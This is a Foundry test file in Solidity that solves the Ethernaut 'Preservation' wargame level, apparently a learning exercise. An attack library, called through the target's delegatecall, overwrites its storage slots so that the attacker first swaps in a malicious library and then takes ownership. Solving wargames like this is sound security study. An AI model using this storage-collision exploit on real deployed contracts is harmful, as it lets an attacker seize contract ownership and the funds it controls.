//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console} from "forge-std/Test.sol";
import {Preservation} from "../src/level17.sol";

contract PreservationTest is Test {
    Preservation public preservation;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(player, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.startPrank(player);
        preservation = new Preservation(
            address(new DummyLibrary()),
            address(new DummyLibrary())
        );
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);
        AttackLibrary attackLibrary = new AttackLibrary();
        preservation.setFirstTime(uint160(address(attackLibrary))); //we can convert address into uint160 in the delagate call it will store on the first slot u know first slot is timezonelibrary and after change again call the setFirstTime function then u can call the attackLibrary
        assertEq(
            uint160(address(attackLibrary)),
            uint160(preservation.timeZone1Library())
        );
        preservation.setFirstTime(uint160(attacker));
        assertEq(preservation.owner(), attacker);

        vm.stopPrank();
    }
}

contract DummyLibrary {
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

contract AttackLibrary {
    function setTime(uint256 _time) public {
        address _target = address(uint160(_time)); //convert time into address
        assembly {
            sstore(2, _target)
        }
    }
}
